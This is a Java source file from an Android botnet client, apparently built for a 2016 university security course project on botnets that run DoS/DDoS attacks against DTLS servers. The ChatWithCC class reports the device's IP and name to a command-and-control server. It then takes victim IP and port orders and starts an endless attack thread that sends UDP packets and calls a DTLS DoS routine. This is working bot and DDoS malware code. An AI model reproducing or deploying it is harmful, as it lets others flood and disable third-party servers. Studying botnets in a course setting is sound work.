package botnet.botmasterandroidclient;
/**
 *                     Πανεπιστήμιο Αιγαίου
 *      Τμήμα Μηχανικών Πληροφοριακών & Επικοινωνιακών Συστημάτων
 *
 *          Ασφάλεια Ασύρματων & Κινητών Δικτύων Επικοινωνιών
 *                     Εαρινό Εξάμηνο 2016
 *                      Project Μαθήματος
 *
 * Δημιουργία secure botnet με android clients & Dos/DDoS σε DTLS Server.
 *
 *          Πέππας Κωνσταντίνος 321/2011134 - icsd11134@icsd.aegean.gr
 *          Σωτηρέλης Χρήστος   321/2012182 - icsd12182@icsd.aegean.gr
 *          Χαϊκάλης Νικόλαος   321/2012200 - icsd12200@icsd.aegean.gr
 *
 *          Καθηγητής Μαθήματος: Γ. Καμπουράκης
 *
 */
import android.util.Log;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.logging.Level;
import java.util.logging.Logger;

import javax.net.ssl.SSLSocket;

/**
 * Created by Alcohealism on 12-Apr-16.
 */
public class ChatWithCC implements Serializable {
    private int port; //port epikoinwnias me ton C&C Server
    private String CC_IP; //ip tou C&C Server
    private ObjectOutputStream oos;
    private ObjectInputStream ois;
    private boolean keepWalking = true;
    private boolean keepAttacking = true;
    private Messages msgs = new Messages();
    private String IP, PCname;
    private Process p1;
    private SSLSocket socket;

    /**
     * @param port
     * @param CC_IP
     * Diavazw tis @params apo ton admin otan thelei na dwsei
     * diaforetiko port k IP apo ta default.
     */
    public ChatWithCC(int port, String CC_IP, SSLSocket socket) {
        this.port = port;
        this.CC_IP = CC_IP;
        this.socket = socket;
    }

    /**
     * @param port
     * otan o admin thelei na dwsei mono diaforetiko port ara
     * i CC_IP tha parei timi "localhost"
     */
    public ChatWithCC(int port, SSLSocket socket) {
        this.port = port;
        CC_IP = "localhost";
        this.socket = socket;
    }

    /**
     * @param CC_IP
     * Otan o admin thelei na dwsei mono diaforeretiki IP ara to port
     * to afinume default.
     */
    public ChatWithCC(String CC_IP, SSLSocket socket) {
        this.CC_IP = CC_IP;
        port = 5555;
    }

    /**
     * Default Constructor gia tis default times tis epikoinwnias mas
     */
    public ChatWithCC(SSLSocket socket){
        CC_IP = "localhost";
        port = 5555;
        this.socket = socket;
    }

    public ChatWithCC(ObjectOutputStream oos, ObjectInputStream ois){
        this.oos = oos;
        this.ois =ois;
    }

    public void StartChating() throws IOException {
        IP = GetHostAddress(); //Diavazw tin IP tou mixanimatos.
        PCname = "Android: "+GetHostName(); //Daivazw to Name tou Mixanimatos.
        Log.d("IP:",IP);
        Log.d("name: ", PCname);
        Chat_Thread.start(); //Ksekinaei to chat me ton C&C.
    }


    /**
        * Methodos gia na stamatisw tin sindesi me ton C&C Server.
     */
    public void Stop_Connection(){
        keepWalking = false; //gia na stamatisei to chat alliws to thread dn ginete interrupt gt dn stamataei i liturgeia tou.
        Chat_Thread.interrupt();
        try {
            if(oos != null) oos.close();
            if(ois != null) ois.close();
        } catch (IOException ex) {
            Logger.getLogger(ChatWithCC.class.getName()).log(Level.SEVERE, null, ex);
        }
        try {
            if(socket !=null) socket.close();
        } catch (IOException ex) {
            Logger.getLogger(ChatWithCC.class.getName()).log(Level.SEVERE, null, ex);
        }
    }

    /**
     * Dimiourgia enos thread pou tha xrisimopoiisw tin class chat
     * prokeimenou na dimiurgisw ena chat metaksi tou Bot kai tou
     * C&C Server.
     */
    Thread Chat_Thread = new Thread(new Runnable(){
        @Override
        public void run() {
            Chat chating = new Chat(oos, ois, "C&C Server");
            Bot_Properties bp = new Bot_Properties(IP, PCname);
            chating.SendMessage(bp);
            chating.SendMessage(msgs.GreetingsServer());
            while(keepWalking == true) {
                Object readObj = chating.readMessage();
                Log.d("Readobj:", readObj.toString());
                /**
                 * An to Bot stilei aitima na klisei tin sindesi k o Server tou apantisei
                 * me "STOP_CONNECTION_WITH_THE_BOTMASTER" tote kleinw tin sindesi.
                 */
                if (readObj.toString().equalsIgnoreCase(msgs.StopConnection())) {
                    Stop_Connection();
                    keepAttacking = false;
                } else if (readObj.toString().equalsIgnoreCase(msgs.BotSendMeYourInfos())) {
                    //bp = new botnet.botmasterandroidclient.Bot_Properties(IP, PCname);
                    //System.out.printf("bot prop");
                    //chating.SendMessage(bp);
                } else {
                    if (readObj instanceof Attack_Properties) {
                        final Attack_Properties ap;
                        ap = (botnet.botmasterandroidclient.Attack_Properties) readObj;
                        System.out.println("Target IP: " + ap.getIP_Victim().toString() + " Port:" + ap.getPort());
                        //Attack(ap.getIP_Victim(), ap.getIP_Victim());
                        Thread attackThread = new Thread(new Runnable(){
                            @Override
                            public void run() {
                                while (true) {
                                    if(keepAttacking == true) {
                                        try {
                                            DatagramSocket sk = (DatagramSocket) new DatagramSocket();
                                            byte[] buf = new byte[1000];
                                            DatagramPacket dp = new DatagramPacket(buf, buf.length);
                                            InetAddress hostAddress = InetAddress.getByName(ap.getIP_Victim());
                                            buf = "hello".getBytes();
                                            dp = new DatagramPacket(buf, buf.length, hostAddress, ap.getPort());
                                            sk.send(dp);
                                            DTLSDoS dos = new DTLSDoS(sk, dp, ap);
                                            dos.Attack();
                                            sk.close();
                                        } catch (SocketException ex) {
                                            Logger.getLogger(ChatWithCC.class.getName()).log(Level.SEVERE, null, ex);
                                        } catch (UnknownHostException ex) {
                                            Logger.getLogger(ChatWithCC.class.getName()).log(Level.SEVERE, null, ex);
                                        } catch (IOException ex) {
                                            Logger.getLogger(ChatWithCC.class.getName()).log(Level.SEVERE, null, ex);
                                        }
                                    }
                                    else{
                                        System.out.println("stop attack");
                                        break;
                                    }
                                }
                            }

                    });attackThread.start();
                    } else if (readObj.toString().equalsIgnoreCase(msgs.StopAttack())) {
                        //StopAttack();
                        Log.d("Retreat", ":(");
                    }
                }
            }
        }
    });

    private void StopAttack(){
       // System.out.println("Retreat my Bots!!!!");
        p1.destroy();
    }

    /**
     * Methodos pou kanw return tin local ip tou mixanimatos.
     */
    private String GetHostAddress() throws UnknownHostException {
        return Inet4Address.getLocalHost().getHostAddress();
    }

    /**
     * Methodos pou kanw return to name tou mixanimatos.
     */
    private String GetHostName() throws UnknownHostException{
        return Inet4Address.getLocalHost().getHostName();
    }
}
